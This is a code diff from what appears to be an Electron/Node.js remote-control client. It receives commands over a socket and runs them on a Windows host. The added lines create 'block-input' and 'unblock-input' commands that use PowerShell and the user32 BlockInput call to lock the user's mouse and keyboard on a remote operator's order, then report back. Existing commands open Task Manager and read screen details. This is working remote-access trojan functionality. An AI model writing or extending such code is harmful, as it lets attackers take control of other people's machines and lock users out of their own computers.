@@ -100,6 +100,12 @@ socket_on_command = async (cmd) => {
   } else if (cmd === 'open-taskmgr') {
     require('child_process').exec('taskmgr');
     socket.emit('command:result', { cmd, data: 'Gestionnaire ouvert' });
+  } else if (cmd === 'block-input') {
+    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($true)"`, () => {});
+    socket.emit('command:result', { cmd, data: 'Souris/clavier bloqués' });
+  } else if (cmd === 'unblock-input') {
+    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($false)"`, () => {});
+    socket.emit('command:result', { cmd, data: 'Souris/clavier débloqués' });
   } else if (cmd === 'screenshot-info') {
     const info = await ipcRenderer.invoke('get-screen-size');
     socket.emit('command:result', { cmd, data: info });
